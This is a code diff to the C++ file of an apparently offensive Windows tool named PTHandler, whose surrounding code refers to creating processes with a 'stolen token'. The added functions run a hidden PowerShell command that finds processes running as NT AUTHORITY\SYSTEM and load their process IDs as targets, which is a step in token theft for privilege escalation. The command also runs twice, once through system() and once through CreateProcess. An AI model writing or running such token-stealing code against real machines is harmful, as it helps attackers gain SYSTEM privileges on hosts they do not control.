@@ -6,6 +6,9 @@
 #include <iostream>
 #include <tchar.h>
 #include <atlconv.h>
+#include <fstream>
+#include <string>
+#include <sstream>
 #include "PTHandler.h"
 
 PTHandler::PTHandler() {
@@ -321,20 +324,54 @@ void PTHandler::createProcessWithToken(HANDLE stolenToken, const std::string &pr
 
 }
 
+//Peut-être passer par des pipes pour pas avoir a utiliser de fichier de sauvegarde
 void PTHandler::fetchAdminTokensThroughPowershell(const std::string& outputPath) {
-    std::string command = R"(powershell.exe -Command "Get-Process -IncludeUserName | Select-Object -Property Id,UserName | Where-Object { $_.UserName -eq "NT AUTHORITY\SYSTEM" })" + outputPath + "\"";
+    std::string command = "powershell.exe -Command \"Get-Process -IncludeUserName | "
+                          "Select-Object -Property Id,UserName | "
+                          "Where-Object { $_.UserName -eq 'NT AUTHORITY\\SYSTEM' } | "
+                          "Export-Csv '" + outputPath + "' -NoTypeInformation\"";
     system(command.c_str());
     STARTUPINFO si = {};
     PROCESS_INFORMATION pi = {};
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    if (!CreateProcess(nullptr, const_cast<LPSTR>(command.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
+    if (!CreateProcess(nullptr,
+                       const_cast<LPSTR>(command.c_str()),
+                       nullptr,
+                       nullptr,
+                       FALSE,
+                       0,
+                       nullptr,
+                       nullptr,
+                       &si,
+                       &pi))
+    {
         std::cout << "[*] - Couldn't create powershell process, error: " << GetLastError() << std::endl;
         return;
     }
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+}
+
+void PTHandler::loadAdminTokensFromPowershellOutput(const std::string &inputPath) {
+    std::ifstream input(inputPath);
+    std::string line;
+    while (std::getline(input,line)) {
+        std::stringstream ss(line);
+        std::string pid;
+        while (std::getline(ss, pid, ',')) {
+            DWORD pidDw;
+            pid = pid.substr(1, pid.length() - 2);
+            try {
+                pidDw = std::stoi(pid);
+                this->adminProcessIDs.push_back(pidDw);
+            } catch (std::invalid_argument& e) {
+                //zzZ
+                continue;
+            }
+        }
+    }
 }
 
 
